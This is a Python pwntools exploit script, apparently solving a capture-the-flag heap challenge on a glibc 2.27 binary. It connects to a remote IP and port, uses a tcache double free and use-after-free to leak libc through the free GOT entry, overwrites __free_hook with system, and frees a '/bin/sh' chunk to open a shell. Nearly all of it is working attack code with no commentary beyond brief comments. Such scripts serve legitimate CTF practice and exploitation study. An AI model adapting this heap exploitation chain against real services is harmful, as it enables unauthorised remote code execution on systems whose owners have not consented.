#!/usr/bin/env python3

from pwn import *
import subprocess

exe = ELF("./vuln_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-2.27.so", checksec=False)

context.binary = exe
# context.log_level = 'debug'

def newadmin():
    p.sendlineafter(b'Choice:', b'1')

def newuser(name):
    p.sendlineafter(b'Choice:', b'2')
    p.sendafter(b'your name:', name)

def admininfo():
    p.sendlineafter(b'Choice:', b'3')
    return p.recvline()

def editname(name):
    p.sendlineafter(b'Choice:', b'4')
    p.sendafter(b'your name:', name)

def printname():
    p.sendlineafter(b'Choice:', b'5')
    return p.recvline()

def deleteadmin():
    p.sendlineafter(b'Choice:', b'6')

def deleteuser():
    p.sendlineafter(b'Choice:', b'7')

# p = process('./vuln_patched')
p = connect('35.246.134.224', 30653)

##########################
### Stage 1: Leak libc ###
##########################
log.info("Stage 1: Leaking libc address...")

free_got = exe.got['free']

# Double Free
newuser(b'AAAAAAAA')
deleteuser()
deleteuser()

# Use After Free
editname(p64(free_got))
newadmin()
newuser(b'A')

# Leak address
free_addr = printname().split(b'name is ')[1][1:-1]
free_addr = u64(b'\x50' + free_addr + b'\x00\x00')
log.success("Free address: " + hex(free_addr))
libc.address = free_addr - libc.sym['free']
log.success('Libc base: ' + hex(libc.address))

# Correct the free@got
editname(p64(libc.sym['free']))

########################
### Stage 2: Exploit ###
########################
log.info("Stage 2: Overwrite __free_hook and spawn shell...")

# Free admin
deleteadmin()

# Malloc and double free
newuser(b'A'*8)
deleteuser()
deleteuser()

# Overwrite forward pointer
editname(p64(libc.sym['__free_hook']))

# Overwrite __free_hook
newuser(b'A'*8)
newuser(p64(libc.sym['system']))

# Create chunk contains b'/bin/sh\x00'
newuser(b'/bin/sh\x00')

# Free will check if __free_hook is null
# If not (we overwrited), execute the function in 
# __free_hook, which is system
deleteuser()

p.interactive()